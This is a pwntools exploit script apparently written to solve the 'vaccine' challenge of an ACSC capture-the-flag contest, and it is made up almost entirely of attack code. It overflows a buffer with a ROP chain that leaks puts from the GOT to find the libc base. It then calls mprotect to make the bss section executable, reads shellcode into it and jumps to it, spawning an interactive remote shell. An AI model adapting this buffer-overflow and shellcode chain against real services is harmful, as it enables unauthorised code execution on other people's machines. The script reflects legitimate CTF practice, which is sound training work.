from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(['./vaccine'])
sh = remote('vaccine-2.chal.ctf.acsc.asia', 1337)
elf = ELF('./vaccine')
#libc = ELF('./libc6-i386_2.31-9_amd64.so')
libc = ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6')

pop_rdi_ret = 0x401443
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

# gdb.attach(sh, 'b *0x00000000004013D7')
# pause()
payload = b'AAAA' + b'\x00'*108 + b'AAAA\x00'
payload = payload.ljust(0x108, b'\x00')
payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(0x401236)
sh.sendlineafter(b'Give me vaccine: ', payload)
sh.recvuntil(b'castle\n')

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x84420
mprotect = libc_base + libc.sym['mprotect']
read = libc_base + libc.sym['read']
pop_rsi_ret = libc_base + 0x02601f
pop_rdx_r12_ret = libc_base + 0x119211

print(hex(libc_base))
payload = b'AAAA' + b'\x00'*108 + b'AAAA\x00'
payload = payload.ljust(0x108, b'\x00')
payload += p64(pop_rdi_ret) + p64(elf.bss() & (~0xfff)) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7)*2 + p64(mprotect)
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(elf.bss() + 0x50) + p64(pop_rdx_r12_ret) + p64(0x1000)*2 + p64(read) + p64(elf.bss() + 0x50) + p64(0x401236)
sh.sendlineafter(b'Give me vaccine: ', payload)

sh.sendline(asm(shellcraft.sh()))

sh.interactive()